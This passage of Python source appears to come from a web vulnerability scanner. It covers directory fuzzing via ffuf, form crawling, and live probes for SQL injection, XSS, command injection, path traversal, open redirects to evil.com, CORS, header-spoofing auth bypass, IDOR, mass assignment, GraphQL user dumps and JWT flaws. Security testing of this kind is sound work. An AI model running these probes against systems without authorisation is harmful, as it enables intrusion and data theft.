        finally:
            if HAS_TQDM:
                pbar.close()
        return results
    except Exception as e:
        print_error(f"Error in vhost_bruteforce: {e}")
        return results


def dir_bruteforce(target, session, wordlist=None, threads=THREADS, use_ffuf=True):
    try:
        if wordlist is None:
            default_wl = check_seclists()
            if default_wl:
                wordlist = default_wl
        if wordlist and not os.path.isfile(wordlist):
            print_warning(f"Could not read wordlist '{wordlist}'. Using internal list.")
            wordlist = None

        if use_ffuf and check_ffuf() and wordlist and os.path.isfile(wordlist):
            tmp_fd, tmp_path = tempfile.mkstemp(suffix='.json')
            os.close(tmp_fd)

            clean_fd, clean_wl = tempfile.mkstemp(suffix='.txt', prefix='ghost_wl_')
            os.close(clean_fd)
            kept = 0
            try:
                with open(wordlist, 'r', encoding='utf-8', errors='ignore') as src, \
                     open(clean_wl, 'w', encoding='utf-8') as dst:
                    for line in src:
                        entry = line.strip()
                        if not entry or entry.startswith('#'):
                            continue
                        if any(ch.isspace() for ch in entry):
                            continue
                        dst.write(entry + '\n')
                        kept += 1
                print_info(f"Clean wordlist: {kept} valid entries (comments and invalid lines discarded)")
            except Exception as e:
                print_warning(f"Could not clean wordlist ({e}); using original.")
                clean_wl = wordlist

            baseline_size = None
            try:
                base_resp = session.get(target, timeout=DEFAULT_TIMEOUT)
                if base_resp.status_code == 200:
                    baseline_size = len(base_resp.content)
            except Exception:
                pass

            ffuf_cmd = [
                "ffuf", "-u", f"{target}/FUZZ", "-w", clean_wl,
                "-t", str(threads), "-fc", "404,403", "-ac",
                "-o", tmp_path, "-of", "json",
            ]
            ffuf_cmd = _append_ffuf_session_headers(ffuf_cmd, session)
            if baseline_size:
                ffuf_cmd += ["-fs", str(baseline_size)]
            print_info(f"Running: {' '.join(ffuf_cmd[:7])}")
            print()

            results = []
            process = None
            try:
                process = subprocess.Popen(ffuf_cmd)
                process.wait()
                rc = process.returncode
                print()

                if os.path.isfile(tmp_path) and os.path.getsize(tmp_path) > 2:
                    try:
                        hits = _load_ffuf_json_results(tmp_path)

                        STATUS_COLOR = {
                            200: Fore.GREEN,  201: Fore.GREEN,  204: Fore.GREEN,
                            301: Fore.CYAN,   302: Fore.CYAN,   307: Fore.CYAN,   308: Fore.CYAN,
                            401: Fore.YELLOW, 403: Fore.YELLOW,
                            500: Fore.RED,    503: Fore.RED,
                        }

                        if not hits:
                            print(f"\n  {Fore.YELLOW}No results (all filtered by auto-calibration){Style.RESET_ALL}\n")
                        else:
                            table_rows = []
                            for hit in sorted(hits, key=lambda x: (x.get('status', 0), x.get('input', {}).get('FUZZ', ''))):
                                path    = hit.get('input', {}).get('FUZZ', '') or hit.get('url', '')
                                status  = hit.get('status', 0)
                                size    = hit.get('length', 0)
                                words_h = hit.get('words', 0)
                                dur_ns  = hit.get('duration', 0)
                                dur_ms  = dur_ns // 1_000_000 if dur_ns else 0
                                url_hit = hit.get('url', urljoin(target, path))
                                color   = STATUS_COLOR.get(status, Fore.WHITE)
                                table_rows.append([
                                    f"{color}[{status}]{Style.RESET_ALL}",
                                    path,
                                    f"{size:,}",
                                    f"{words_h:,}",
                                    f"{dur_ms}ms",
                                ])
                                results.append({'url': url_hit, 'status': status, 'size': size})
                                FINDINGS.append(f"[DIR] {url_hit} [{status}]")
                            print_table(
                                headers=["STATUS", "PATH", "SIZE", "WORDS", "DUR"],
                                rows=table_rows,
                                alignments=['<', '<', '>', '>', '>'],
                                footer=f"  Total: {Fore.GREEN}{len(hits)}{Style.RESET_ALL} endpoint(s) found\n",
                            )
                    except Exception as e:
                        print_error(f"Error reading ffuf JSON: {e}")

                if rc not in (0, 1):
                    print_error(f"ffuf exited with code {rc}")

            except KeyboardInterrupt:
                print_warning("Fuzzing interrupted by user; waiting for ffuf to save partial results...")
                if process:
                    _wait_for_interrupted_child(process, "ffuf")
                try:
                    existing = {(item.get('url'), item.get('status')) for item in results}
                    for hit in sorted(_load_ffuf_json_results(tmp_path), key=lambda x: (x.get('status', 0), x.get('input', {}).get('FUZZ', ''))):
                        path = hit.get('input', {}).get('FUZZ', '') or hit.get('url', '')
                        status = hit.get('status', 0)
                        size = hit.get('length', 0)
                        url_hit = hit.get('url', urljoin(target, path))
                        key = (url_hit, status)
                        if key in existing:
                            continue
                        existing.add(key)
                        results.append({'url': url_hit, 'status': status, 'size': size})
                        FINDINGS.append(f"[DIR] {url_hit} [{status}]")
                except Exception as e:
                    print_error(f"Error reading partial ffuf JSON: {e}")
                SCAN_DATA["directory_hits"] = results
                print_good(f"{len(results)} directories found so far have been saved.")
                return results
            except Exception as e:
                print_error(f"Error running ffuf: {e}")
                print_warning("Falling back to internal method...")
            finally:
                try:
                    os.unlink(tmp_path)
                except Exception:
                    pass
                if clean_wl and clean_wl != wordlist:
                    try:
                        os.unlink(clean_wl)
                    except Exception:
                        pass

            return results
        else:
            if use_ffuf and not check_ffuf():
                print_warning("ffuf is not installed. Using internal method (slower).")
            if wordlist is None:
                paths = COMMON_DIRS
                print_info(f"Using reduced internal list ({len(paths)} paths)")
            else:
                with open(wordlist, 'r') as f:
                    paths = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                print_info(f"Using wordlist: {wordlist} ({len(paths)} entries)")
            
            results = []
            print_info(f"Starting directory fuzzing (internal method)...")

            def test_path(path):
                url = urljoin(target, path)
                try:
                    resp = session.get(url, timeout=DEFAULT_TIMEOUT)
                    if resp.status_code < 400:
                        return (url, resp.status_code, len(resp.content))
                except Exception:
                    pass
                return None

            if HAS_TQDM:
                with tqdm(total=len(paths), desc="Directory fuzzing", unit="req", ncols=80) as pbar:
                    with ThreadPoolExecutor(max_workers=threads) as executor:
                        future_to_path = {executor.submit(test_path, p): p for p in paths}
                        for future in as_completed(future_to_path):
                            res = future.result()
                            if res:
                                url, code, size = res
                                print_good(f"Found: {url} (code {code}, size {size})")
                                results.append({'url': url, 'status': code, 'size': size})
                            pbar.update(1)
            else:
                completed = 0
                with ThreadPoolExecutor(max_workers=threads) as executor:
                    future_to_path = {executor.submit(test_path, p): p for p in paths}
                    for future in as_completed(future_to_path):
                        completed += 1
                        if completed % 50 == 0 or completed == len(paths):
                            print_info(f"Progress: {completed}/{len(paths)} paths tested")
                        res = future.result()
                        if res:
                            url, code, size = res
                            print_good(f"Found: {url} (code {code}, size {size})")
                            results.append({'url': url, 'status': code, 'size': size})
            return results
    except Exception as e:
        print_error(f"Error in fuzzing: {e}")
        return []

def extract_forms_and_params(target, session):
    def _extract_from_single_page(page_url):
        forms = []
        params = set()
        try:
            resp = session.get(page_url, timeout=DEFAULT_TIMEOUT)
            if resp.status_code >= 400:
                return forms, params
            content_type = (resp.headers.get('Content-Type', '') or '').lower()
            if 'html' not in content_type and '<form' not in resp.text.lower():
                return forms, params

            if HAS_BS4:
                soup = BeautifulSoup(resp.text, 'html.parser')
                for form in soup.find_all('form'):
                    action = form.get('action')
                    method = form.get('method', 'get').upper()
                    inputs = []
                    for inp in form.find_all(['input', 'textarea', 'select']):
                        name = inp.get('name')
                        if not name:
                            continue
                        input_type = (inp.get('type') or '').lower()
                        if input_type in ('submit', 'button', 'image', 'reset', 'file'):
                            continue
                        inputs.append(name)
                    if inputs:
                        forms.append({
                            'page_url': page_url,
                            'action': action,
                            'method': method,
                            'inputs': sorted(set(inputs))
                        })

                for a in soup.find_all('a', href=True):
                    href = a['href']
                    parsed = urlparse(href)
                    if parsed.query:
                        for key in parse_qs(parsed.query).keys():
                            params.add(key)
            else:
                form_regex = re.compile(r'<form.*?action=["\'](.*?)["\'].*?method=["\'](.*?)["\'].*?>', re.I)
                for match in form_regex.finditer(resp.text):
                    action = match.group(1)
                    method = match.group(2).upper()
                    forms.append({'page_url': page_url, 'action': action, 'method': method, 'inputs': []})
                param_regex = re.compile(r'<a\s+href=["\'][^"\']*\?(.*?)(?:["\']|#)', re.I)
                for match in param_regex.finditer(resp.text):
                    query = match.group(1)
                    for key in parse_qs(query).keys():
                        params.add(key)

            parsed_page = urlparse(page_url)
            if parsed_page.query:
                for key in parse_qs(parsed_page.query).keys():
                    params.add(key)
        except Exception:
            pass
        return forms, params

    try:
        forms = []
        params = set()
        form_keys = set()

        print_info("Crawling to exhaustively detect forms and inputs...")
        discovered_urls, spider_params, spider_forms = spider_website(
            target,
            session,
            max_pages=250,
            max_depth=3,
            use_robots=True,
        )

        params.update(spider_params or set())

        for f in spider_forms or []:
            action_url = f.get('action') or f.get('url') or f.get('page_url') or target
            method = (f.get('method') or 'GET').upper()
            inputs = sorted(set(f.get('inputs', [])))
            if not inputs:
                continue
            key = (action_url, method, tuple(inputs))
            if key in form_keys:
                continue
            form_keys.add(key)
            forms.append({
                'page_url': f.get('page_url', action_url),
                'action': action_url,
                'method': method,
                'inputs': inputs,
            })

        print_info(f"Forms found: {len(forms)}")
        print_info(f"Unique parameters in links: {len(params)}")
        return forms, list(params)
    except Exception as e:
        print_error(f"Error extracting forms/parameters: {e}")
        return [], []

SQLI_SLEEP_SECONDS = 5


def _timed_request(url, param, value, session, method):
    """Send a single request and return (response, elapsed_seconds)."""
    timeout = DEFAULT_TIMEOUT + SQLI_SLEEP_SECONDS + 3
    start = time.time()
    if method == 'GET':
        resp = session.get(f"{url}?{param}={value}", timeout=timeout)
    else:
        resp = session.post(url, data={param: value}, timeout=timeout)
    return resp, time.time() - start


def advanced_injection_tests(url, param, session, method='GET'):
    try:
        try:
            _, baseline = _timed_request(url, param, "1", session, method)
        except KeyboardInterrupt:
            print_warning("Injection test interrupted by user.")
            return False
        except Exception:
            baseline = None
        if baseline is not None:
            threshold = baseline + SQLI_SLEEP_SECONDS - 1.5
            for payload in ["' OR SLEEP(5)-- ", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"]:
                try:
                    _, elapsed = _timed_request(url, param, payload, session, method)
                    if elapsed < threshold:
                        continue
                    _, confirm = _timed_request(url, param, payload, session, method)
                    if confirm >= threshold:
                        print_vuln(
                            f"Possible time-based SQLi in {param} "
                            f"(baseline {baseline:.2f}s, payload {elapsed:.2f}s/{confirm:.2f}s)"
                        )
                        return True
                except KeyboardInterrupt:
                    print_warning("Injection test interrupted by user.")
                    return False
                except Exception:
                    pass
        for payload in XSS_PAYLOADS:
            try:
                if method == 'GET':
                    test_url = f"{url}?{param}={payload}"
                    resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
                else:
                    resp = session.post(url, data={param: payload}, timeout=DEFAULT_TIMEOUT)
                content_type = (resp.headers.get('Content-Type', '') or '').lower()
                is_html = 'html' in content_type or not content_type
                if is_html and payload in resp.text and ('<script>' in payload or 'onerror=' in payload or 'onload=' in payload):
                    print_vuln(f"Possible reflected XSS in {param} with payload: {payload}")
                    return True
            except KeyboardInterrupt:
                print_warning("Injection test interrupted by user.")
                return False
            except Exception:
                pass
        for payload in COMMAND_INJECT:
            try:
                if method == 'GET':
                    test_url = f"{url}?{param}={payload}"
                    resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
                else:
                    resp = session.post(url, data={param: payload}, timeout=DEFAULT_TIMEOUT)
                if "uid=" in resp.text or "Directory of" in resp.text:
                    print_vuln(f"Possible Command Injection in {param} with payload: {payload}")
                    return True
            except KeyboardInterrupt:
                print_warning("Injection test interrupted by user.")
                return False
            except Exception:
                pass
        return False
    except Exception as e:
        print_error(f"Error in advanced_injection_tests for {param}: {e}")
        return False

def test_path_traversal(url, param, session, method='GET'):
    try:
        for payload in PATH_TRAVERSAL:
            try:
                if method == 'GET':
                    test_url = f"{url}?{param}={payload}"
                    resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
                else:
                    resp = session.post(url, data={param: payload}, timeout=DEFAULT_TIMEOUT)
                if "root:" in resp.text or "[extensions]" in resp.text:
                    print_vuln(f"Path Traversal in {param}: {payload}")
                    return True
            except KeyboardInterrupt:
                print_warning("Path Traversal test interrupted by user.")
                return False
            except Exception:
                pass
        return False
    except Exception as e:
        print_error(f"Error in path traversal: {e}")
        return False

def test_open_redirect(url, param, session, method='GET'):
    try:
        for payload in OPEN_REDIRECT:
            try:
                if method == 'GET':
                    test_url = f"{url}?{param}={payload}"
                    resp = session.get(test_url, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
                else:
                    resp = session.post(url, data={param: payload}, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
                if resp.status_code in (301, 302, 303, 307, 308):
                    location = resp.headers.get('Location', '')
                    redirect_host = (urlparse(location).hostname or '').lower()
                    if redirect_host == 'evil.com' or redirect_host.endswith('.evil.com'):
                        print_vuln(f"Open Redirect in {param} -> {location}")
                        return True
            except KeyboardInterrupt:
                print_warning("Open Redirect test interrupted by user.")
                return False
            except Exception:
                pass
        return False
    except Exception as e:
        print_error(f"Error in open redirect: {e}")
        return False

def check_security_headers(headers):
    try:
        checks = {
            'Strict-Transport-Security': 'HSTS not implemented',
            'Content-Security-Policy': 'CSP not implemented',
            'X-Frame-Options': 'Clickjacking: missing X-Frame-Options',
            'X-Content-Type-Options': 'Missing X-Content-Type-Options',
            'Referrer-Policy': 'Missing Referrer-Policy'
        }
        for header, warning in checks.items():
            if header not in headers:
                print_warning(warning)
            else:
                print_good(f"{header}: {headers[header]}")
    except Exception as e:
        print_error(f"Error checking headers: {e}")

def check_cookie_security(cookies):
    try:
        for cookie in cookies:
            name = cookie.name
            if not cookie.secure:
                print_warning(f"Cookie '{name}' missing Secure flag")
            if not cookie.has_nonstandard_attr('HttpOnly'):
                print_warning(f"Cookie '{name}' missing HttpOnly flag")
    except Exception as e:
        print_error(f"Error checking cookies: {e}")

def check_info_disclosure(resp_text):
    try:
        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', resp_text)
        if emails:
            print_warning(f"Exposed emails: {', '.join(set(emails))}")
        internal_paths = re.findall(r'(?:C:\\|/home/|/var/www/|/etc/)[^\s\'"<>]+', resp_text, re.I)
        if internal_paths:
            print_warning(f"Exposed internal paths: {set(internal_paths)}")
        comments = re.findall(r'<!--(.*?)-->', resp_text, re.DOTALL)
        suspicious = [c for c in comments if re.search(r'todo|fixme|debug|password|key|token', c, re.I)]
        if suspicious:
            print_warning("Sensitive information in HTML comments")
    except Exception as e:
        print_error(f"Error in info disclosure: {e}")

def check_directory_listing(url, session):
    try:
        test_url = urljoin(url, 'images/')
        resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
        if resp.status_code == 200 and ('Index of /' in resp.text or 'Parent Directory' in resp.text):
            print_vuln(f"Directory listing at {test_url}")
    except Exception:
        pass

def check_ssl_tls(target):
    try:
        parsed = urlparse(target)
        if parsed.scheme != 'https':
            print_info("SSL/TLS will not be evaluated (not HTTPS)")
            return
        hostname = parsed.hostname
        port = parsed.port or 443
        context = ssl.create_default_context()
        with socket.create_connection((hostname, port), timeout=DEFAULT_TIMEOUT) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                print_info(f"Certificate for: {cert.get('subject')}")
                version = ssock.version()
                if version and version not in ('TLSv1.2', 'TLSv1.3'):
                    print_warning(f"Insecure TLS protocol: {version}")
                else:
                    print_good(f"TLS protocol: {version}")
    except Exception as e:
        print_error(f"SSL/TLS error: {e}")

def test_cors_advanced(target, session):
    """OWASP API8 / WSTG-CLNT-007: Check for insecure CORS configurations."""
    try:
        parsed = urlparse(target)
        evil_origins = [
            "https://evil.com",
            "null",
            f"https://{parsed.netloc}.evil.com",
            f"https://evil.{parsed.netloc}",
        ]
        for origin in evil_origins:
            try:
                resp = session.get(target, timeout=DEFAULT_TIMEOUT, headers={'Origin': origin})
                acao = resp.headers.get('Access-Control-Allow-Origin', '')
                acac = resp.headers.get('Access-Control-Allow-Credentials', '').lower()
                if acao == '*' and acac == 'true':
                    print_vuln(f"Critical CORS: wildcard + Allow-Credentials=true [{origin}]")
                elif acao == origin:
                    if acac == 'true':
                        print_vuln(f"CORS: reflected origin with credentials allowed -> {origin}")
                    else:
                        print_warning(f"CORS: reflected origin without credentials -> {origin}")
                elif acao == '*':
                    print_warning("CORS: wildcard (*) without Allow-Credentials")
                try:
                    pre = session.options(target, timeout=DEFAULT_TIMEOUT, headers={
                        'Origin': origin,
                        'Access-Control-Request-Method': 'POST',
                        'Access-Control-Request-Headers': 'Authorization',
                    })
                    pre_acao = pre.headers.get('Access-Control-Allow-Origin', '')
                    if pre_acao == origin or pre_acao == '*':
                        print_info(f"  CORS preflight accepts POST+Authorization from {origin}")
                except Exception:
                    pass
            except Exception:
                pass
    except Exception as e:
        print_error(f"Error in advanced CORS test: {e}")



def discover_api_endpoints(target, session):
    """OWASP API9: Discover exposed endpoints and analyze OpenAPI/Swagger documentation.
    Also performs recursive fuzzing under prefixes /api/v1, /api/v2, /v1, etc."""
    found = []
    seen_urls = set()

    INTERESTING = {200, 201, 202, 204, 301, 302, 307, 308, 401, 403, 405, 500}

    def _probe(endpoint, depth_label=""):
        """Probe an endpoint with GET. Returns dict if interesting, None otherwise."""
        url = urljoin(target, endpoint)
        if url in seen_urls:
            return None
        seen_urls.add(url)
        try:
            resp = session.get(url, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
        except Exception:
            return None
        st = resp.status_code
        if st not in INTERESTING:
            return None
        ct = resp.headers.get('Content-Type', '').split(';')[0].strip()
        item = {'url': url, 'endpoint': endpoint, 'status': st, 'content_type': ct}

        prefix = f"  {depth_label}" if depth_label else ""
        if st in (200, 201, 202, 204):
            print_good(f"{prefix}[{st}] {url}  ({ct})")
        elif st in (301, 302, 307, 308):
            loc = resp.headers.get('Location', '')
            print_info(f"{prefix}[{st}] {url} -> {loc}")
        elif st == 401:
            print_warning(f"{prefix}[401] {url}  (requires authentication)")
        elif st == 403:
            print_warning(f"{prefix}[403] {url}  (forbidden)")
        elif st == 405:
            allow = resp.headers.get('Allow', '')
            print_warning(f"{prefix}[405] {url}  (method not allowed; Allow: {allow or 'N/A'})")
        elif st == 500:
            print_error(f"{prefix}[500] {url}  (internal error — possible unhandled parameter)")

        if st == 200 and any(x in endpoint for x in ('swagger', 'openapi', 'api-docs')):
            try:
                doc = resp.json()
                paths = list(doc.get('paths', {}).keys())
                if paths:
                    print_info(f"  Documented paths ({len(paths)}): {', '.join(paths[:12])}")
                    for path in paths:
                        extra_url = urljoin(target, path)
                        if extra_url not in seen_urls:
                            seen_urls.add(extra_url)
                            found.append({'url': extra_url, 'endpoint': path,
                                          'status': 0, 'content_type': ''})
            except Exception:
                pass
        return item

    try:
        print_info(f"Scanning {len(API_ENDPOINTS)} known API paths...")
        for ep in API_ENDPOINTS:
            item = _probe(ep)
            if item:
                found.append(item)

        prefixes_to_fuzz = list(API_BASE_PREFIXES)

        for item in list(found):
            ep = item.get('endpoint', '')
            if not ep or not ep.startswith('/'):
                continue
            parts = [p for p in ep.split('/') if p]
            for i in range(1, len(parts)):
                candidate = '/' + '/'.join(parts[:i])
                if candidate not in prefixes_to_fuzz:
                    prefixes_to_fuzz.append(candidate)

        seen_pref = set()
        prefixes_to_fuzz = [p for p in prefixes_to_fuzz if not (p in seen_pref or seen_pref.add(p))]

        print_info(
            f"Recursive fuzzing: {len(API_RESOURCES)} resources × "
            f"{len(prefixes_to_fuzz)} prefixes ({', '.join(prefixes_to_fuzz[:8])}"
            f"{', ...' if len(prefixes_to_fuzz) > 8 else ''})"
        )
        for prefix in prefixes_to_fuzz:
            for resource in API_RESOURCES:
                endpoint = f"{prefix.rstrip('/')}/{resource}"
                item = _probe(endpoint, depth_label="↳ ")
                if item:
                    found.append(item)

        print_info(f"Total API endpoints found/accessible: {len(found)}")
        if found:
            STATUS_COLOR = {
                200: Fore.GREEN, 201: Fore.GREEN, 202: Fore.GREEN, 204: Fore.GREEN,
                301: Fore.CYAN, 302: Fore.CYAN, 307: Fore.CYAN, 308: Fore.CYAN,
                401: Fore.YELLOW, 403: Fore.YELLOW, 405: Fore.YELLOW,
                500: Fore.RED, 503: Fore.RED,
            }
            rows = []
            for item in sorted(found, key=lambda x: (x.get('status', 0), x.get('endpoint', ''))):
                st = item.get('status', 0)
                color = STATUS_COLOR.get(st, Fore.WHITE)
                rows.append([
                    f"{color}[{st}]{Style.RESET_ALL}",
                    item.get('endpoint', ''),
                    item.get('url', ''),
                    item.get('content_type', '') or '-',
                ])
            print_table(
                headers=["STATUS", "ENDPOINT", "URL", "CONTENT-TYPE"],
                rows=rows,
                alignments=['<', '<', '<', '<'],
                title="Discovered API Endpoints:",
            )
    except Exception as e:
        print_error(f"Error discovering endpoints: {e}")
    return found


def test_api_auth_bypass(found_endpoints, session):
    """OWASP API5/BFLA: Detect restricted endpoints accessible without authentication."""
    try:
        unauth_session = get_session()
        bypass_headers_list = [
            {'X-Original-URL': '/admin'},
            {'X-Rewrite-URL': '/admin'},
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
        ]
        restricted = [item for item in found_endpoints if item['status'] in (401, 403)]
        if not restricted:
            print_info("No restricted endpoints found to test bypass.")
            return
        for item in restricted:
            url = item['url']
            try:
                resp = unauth_session.get(url, timeout=DEFAULT_TIMEOUT)
                if resp.status_code == 200 and len(resp.content) > 50:
                    print_vuln(f"BFLA: accessible without auth -> {url}")
                    continue
            except Exception:
                pass
            for hdrs in bypass_headers_list:
                try:
                    resp = unauth_session.get(url, timeout=DEFAULT_TIMEOUT, headers=hdrs)
                    if resp.status_code == 200:
                        print_vuln(f"Auth bypass with {list(hdrs.keys())[0]} on {url}")
                        break
                except Exception:
                    pass
    except Exception as e:
        print_error(f"Error in auth bypass test: {e}")


def test_api_idor(found_endpoints, session):
    """OWASP API1/BOLA: Test IDOR by modifying IDs in paths and query params."""
    try:
        id_patterns = [
            (r'((?:/[a-zA-Z_-]+)/)(\d{1,10})(/|$)', 2),
            (r'([?&](?:id|user_id|uid|account_id|object_id)=)(\d+)', 2),
            (r'((?:/[a-zA-Z_-]+)/)([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', 2),
        ]
        alt_ids = ['0', '1', '2', '-1', '9999', '../1']
        tested = set()
        hits = 0
        for item in found_endpoints:
            url = item['url']
            for pattern, group in id_patterns:
                match = re.search(pattern, url)
                if not match:
                    continue
                original_id = match.group(group)
                prefix = url[:match.start(group)]
                suffix = url[match.end(group):]
                try:
                    base_resp = session.get(url, timeout=DEFAULT_TIMEOUT)
                    if base_resp.status_code != 200:
                        continue
                    base_len = len(base_resp.content)
                except Exception:
                    continue
                for alt in alt_ids:
                    if alt == original_id:
                        continue
                    test_url = prefix + alt + suffix
                    if test_url in tested:
                        continue
                    tested.add(test_url)
                    try:
                        resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
                        if resp.status_code == 200 and base_len > 0:
                            diff_ratio = abs(len(resp.content) - base_len) / base_len
                            if diff_ratio < 0.4:
                                print_vuln(f"IDOR: {url} -> ID={alt} devuelve {resp.status_code} "
                                           f"({len(resp.content)}B, ratio_diff={diff_ratio:.2f})")
                                hits += 1
                    except Exception:
                        pass
        if hits == 0:
            print_info("No clear IDOR evidence in found endpoints.")
    except Exception as e:
        print_error(f"Error in IDOR test: {e}")


def test_api_mass_assignment(found_endpoints, session):
    """OWASP API6: Inject privileged fields into JSON-accepting endpoints."""
    try:
        targets = [item for item in found_endpoints
                   if item['status'] in (200, 201, 0)
                   and any(x in item['endpoint'] for x in
                           ('user', 'profile', 'account', 'register', 'update', 'me', 'signup'))]
        if not targets:
            print_info("No candidate endpoints for Mass Assignment.")
            return
        method_map = [('POST', 'post'), ('PUT', 'put'), ('PATCH', 'patch')]
        for item in targets:
            url = item['url']
            for fields in MASS_ASSIGNMENT_FIELDS[:6]:
                for method_name, method_attr in method_map:
                    try:
                        method = getattr(session, method_attr)
                        resp = method(url, json=fields, timeout=DEFAULT_TIMEOUT)
                        if resp.status_code in (200, 201, 202, 204):
                            key = list(fields.keys())[0]
                            resp_lower = resp.text.lower()
                            if key in resp_lower or 'admin' in resp_lower or 'success' in resp_lower:
                                print_vuln(f"Mass Assignment in {url} [{method_name}] with {fields}")
                                break
                    except Exception:
                        pass
    except Exception as e:
        print_error(f"Error in Mass Assignment test: {e}")


def test_graphql(target, session):
    """OWASP API8: GraphQL introspection enabled and dangerous queries."""
    try:
        gql_endpoints = [urljoin(target, ep)
                         for ep in ('/graphql', '/graphiql', '/api/graphql', '/query', '/api/query')]
        introspection = {'query': '{ __schema { types { name } } }'}
        user_enum = {'query': '{ users { id username email password } }'}
        found_any = False
        for gql_url in gql_endpoints:
            try:
                resp = session.post(gql_url, json=introspection,
                                    headers={'Content-Type': 'application/json'},
                                    timeout=DEFAULT_TIMEOUT)
                if resp.status_code != 200:
                    continue
                data = resp.json()
                if 'data' in data and '__schema' in str(data.get('data', {})):
                    found_any = True
                    print_vuln(f"GraphQL Introspection enabled: {gql_url}")
                    types = [t['name'] for t in data['data']['__schema']['types']
                             if not t['name'].startswith('__')]
                    print_info(f"  Exposed types ({len(types)}): {', '.join(types[:15])}")
                elif 'errors' not in data:
                    found_any = True
                    print_warning(f"GraphQL active (introspection disabled): {gql_url}")
                if found_any:
                    try:
                        r2 = session.post(gql_url, json=user_enum,
                                          headers={'Content-Type': 'application/json'},
                                          timeout=DEFAULT_TIMEOUT)
                        d2 = r2.json()
                        if 'data' in d2 and d2['data'] and 'users' in str(d2['data']):
                            print_vuln(f"GraphQL exposes user listing at {gql_url}")
                    except Exception:
                        pass
                    break
            except Exception:
                pass
        if not found_any:
            print_info("No GraphQL endpoints detected or active.")
    except Exception as e:
        print_error(f"Error in GraphQL test: {e}")


def test_api_verbose_errors(found_endpoints, session):
    """OWASP API7: Detect error responses with exposed internal information."""
    try:
        error_payloads = ["'", '"', '{}', '-1', '../', '%00']
        sensitive_patterns = [
            re.compile(r'exception|traceback|stack.?trace|at \w+\.java:\d+', re.I),
            re.compile(r'sql(?:state)?|mysql|postgresql|sqlite|ora-\d{4,5}', re.I),
            re.compile(r'internal.?server.?error|unhandled.?exception|fatal.?error', re.I),
            re.compile(r'/var/www|c:\\\\inetpub|/home/\w+/|/etc/passwd', re.I),
        ]
        hits = 0
        for item in found_endpoints:
            if item['status'] not in (200, 0):
                continue
            url = item['url']
            for payload in error_payloads[:4]:
                test_url = url.rstrip('/') + payload
                try:
                    resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
                    if resp.status_code in (500, 503):
                        for pat in sensitive_patterns:
                            if pat.search(resp.text):
                                print_vuln(f"Error verbose [{resp.status_code}]: {test_url}")
                                hits += 1
                                break
                except Exception:
                    pass
        if hits == 0:
            print_info("No verbose errors detected in tested endpoints.")
    except Exception as e:
        print_error(f"Error in verbose errors test: {e}")


def test_api_rate_limiting(target, session):
    """OWASP API4: Check for rate limiting on authentication endpoints."""
    try:
        candidates = [
            urljoin(target, '/api/v1/login'),
            urljoin(target, '/api/login'),
            urljoin(target, '/api/auth'),
            urljoin(target, '/login'),
        ]
        for test_url in candidates:
            statuses = []
            for _ in range(20):
                try:
                    resp = session.post(test_url,
                                        json={'username': 'test', 'password': 'test'},
                                        timeout=DEFAULT_TIMEOUT)
                    statuses.append(resp.status_code)
                    if resp.status_code == 429:
                        break
                except Exception:
                    break
            if not statuses:
                continue
            if 429 in statuses:
                print_good(f"Rate limiting active (HTTP 429) on {test_url}")
            elif all(s not in (429, 503) for s in statuses):
                print_warning(f"No rate limiting: {len(statuses)} requests without blocking on {test_url}")
            break
    except Exception as e:
        print_error(f"Error in rate limiting test: {e}")


def test_jwt_tokens(target, session):
    """OWASP API2: Detect JWT in headers/cookies and analyze algorithm and fields."""
    try:
        resp = session.get(target, timeout=DEFAULT_TIMEOUT)
        jwt_regex = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')
        jwt_candidates = set()
        for header_val in resp.headers.values():
            jwt_candidates.update(jwt_regex.findall(header_val))
        for cookie in resp.cookies:
            jwt_candidates.update(jwt_regex.findall(cookie.value))
        if not jwt_candidates:
            print_info("No JWT detected in headers/cookies of the main page.")
            return
        for jwt in jwt_candidates:
            try:
                parts = jwt.split('.')
                if len(parts) < 3:
                    continue
                def _b64_decode(s):
                    s += '=' * (4 - len(s) % 4)
                    return json.loads(base64.urlsafe_b64decode(s).decode('utf-8', errors='ignore'))
                header_data = _b64_decode(parts[0])
                payload_data = _b64_decode(parts[1])
                alg = header_data.get('alg', '').upper()
                print_info(f"JWT detected — alg: {alg}  kid: {header_data.get('kid', 'N/A')}")
                if alg in ('NONE', ''):
                    print_vuln("JWT with alg:none — signature completely ignored")
                elif alg in ('HS256', 'HS384', 'HS512'):
                    print_warning(f"JWT HMAC ({alg}) — check for weak secret manually")
                sensitive_keys = {'admin', 'role', 'is_admin', 'permission', 'privilege', 'scope'}
                exposed = [k for k in payload_data if k.lower() in sensitive_keys]
                if exposed:
                    print_warning(f"  JWT contains privilege fields: {exposed}")
                    for k in exposed:
                        print_info(f"    {k} = {payload_data[k]}")
                exp = payload_data.get('exp')
                if exp and exp < time.time():
                    print_warning("  Expired JWT still accepted by server")
            except Exception:
                pass
    except Exception as e:
        print_error(f"Error in JWT test: {e}")



def enumerate_users_from_endpoints(target, session):
    try:
        users = []
        emails = []
        endpoints_to_try = ["/api/users", "/users", "/rest/users", "/api/user/list", "/admin/users"]
        for endpoint in endpoints_to_try:
            url = urljoin(target, endpoint)
            try:
                resp = session.get(url, timeout=DEFAULT_TIMEOUT)
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        if isinstance(data, list):
                            for item in data:
                                if 'username' in item: users.append(item['username'])
                                if 'email' in item: emails.append(item['email'])
                        elif isinstance(data, dict):
